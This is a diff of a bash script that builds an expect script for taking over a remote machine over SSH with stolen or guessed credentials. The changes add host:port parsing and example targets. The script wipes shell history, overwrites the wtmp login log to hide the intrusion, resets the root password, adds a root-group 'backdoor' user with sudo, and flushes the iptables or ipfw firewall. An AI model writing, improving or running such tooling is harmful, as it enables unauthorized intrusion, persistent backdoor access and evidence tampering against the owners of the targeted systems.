@@ -4,7 +4,9 @@
 # remove login history when the "last" command is typed in
 
 if [ "$1" = "-h" -o "$1" = "--help" ]; then
-	echo "Usage: $0 [user@host] [password] [options]"
+	echo "Usage: $0 [user@host]|[user@host:port] [password] [options]"
+	echo "Example: $0 root@1.2.3.4 toor"
+	echo "Example: $0 root@1.2.3.4:2222 toor"
 	exit 0
 fi
 
@@ -19,7 +21,8 @@ alterLastHistory="yes"
 port=22
 
 if [ $# -gt 0 ]; then
-	firstArg=$1
+	firstArg=`echo $1 | /usr/bin/env awk -F":" '{print $1}'`
+	port=`echo $1 | /usr/bin/env awk -F":" '{print $2}'`
 	pass=$2
 	user=`echo $firstArg | /usr/bin/env awk -F"@" '{print $1}'`
 else
@@ -28,20 +31,13 @@ else
 	read -p "Enter username: " user
 	read -p "Enter password: " pass
 	read -p "Enter port: " port
-	if [ "port" == "" ]; then
-		port=22
-	fi
 	firstArg="$user@$host"
 fi
 
-# echo "command would be ssh $firstArg -p $port"
-if [ "$user" == "root" ]; then
-	firstCmd="su"
-else
-	firstCmd="sudo su"
+if [ ${#port} -lt 1 ]; then #if no port given, make default 22
+		port=22
 fi
 
-#switch to sh instead of bash or whatever default is
 echo "#!/usr/bin/expect" > $expectFile #write shebang to file
 
 if [ "$alterLastHistory" == "yes" ]; then #if want to alter last history to cover tracks of logging in, write this to file
@@ -56,47 +52,43 @@ expect "*assword*"
 send "$pass\r"
 sleep 1
 spawn scp -P $port ./evil_ssh_wtmp_backup $firstArg:/var/log/wtmp.bak
-expect {
--re ".*Are.*.*yes.*no.*" {
-send "yes\n"
-exp_continue
-}
 expect "*assword*"
 send "$pass\r"
 sleep 1
 SCP
 fi
 
-/bin/cat <<HEAD >> $expectFile
+/bin/cat <<LOGIN >> $expectFile
 spawn ssh -p $port $firstArg
 expect {
 -re ".*Are.*.*yes.*no.*" {
 send "yes\n"
 exp_continue
 }
-#use correct prompt
-set prompt ":|#|\\\$"
+set prompt ":|#|\\\$" #use correct prompt
 interact -o -nobuffer -re \$prompt return
 send "$pass\r"
-interact -o -nobuffer -re \$prompt return
-send "history -d \`history | wc -l\`; sh" #make sure we don't leave a trail
-HEAD
+LOGIN
 
 if [ "$user" != "root" ]; then #if not root, sudo su to root and send password to be successful
 	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
-	echo "send \"history -d \`history | wc -l\`; sudo su\"" >> $expectFile
+	echo "send \"history -d \`history | wc -l\`; sudo su\r\"" >> $expectFile
 	echo "interact -o -nobuffer -re \"*assword*\" return" >> $expectFile
 	echo "send \"$pass\r\"" >> $expectFile
-	echo "exp_continue" >> $expectFile #not sure if i need this line or not. just in case no pw is needed
+	echo "exp_continue" >> $expectFile #not sure if i need this line or not. just in case no pw prompt given
 fi
 
 /bin/cat<<MORE >> $expectFile
 interact -o -nobuffer -re \$prompt return
+send "history -d \`history | wc -l\`; /bin/sh\r" #make sure we don't leave a trail
+interact -o -nobuffer -re \$prompt return
 send "echo -e \"$newRootPass\n$newRootPass\" | passwd\r" #change root password
 interact -o -nobuffer -re \$prompt return
-send "useradd -g root -G sudo -o -u 250 $newUser" #add 'backdoor' user
+send "useradd -g root -G sudo -o -u 250 $newUser\r" #add 'backdoor' user
 interact -o -nobuffer -re \$prompt return
-send "/usr/bin/env iptables -F || ipfw flush \r"
+send "echo -e \"$newRootPass\n$newRootPass\" | passwd\r" #add 'backdoor' user
+interact -o -nobuffer -re \$prompt return
+send "/usr/bin/env iptables -F || ipfw flush\r"
 MORE
 
 #start certain services
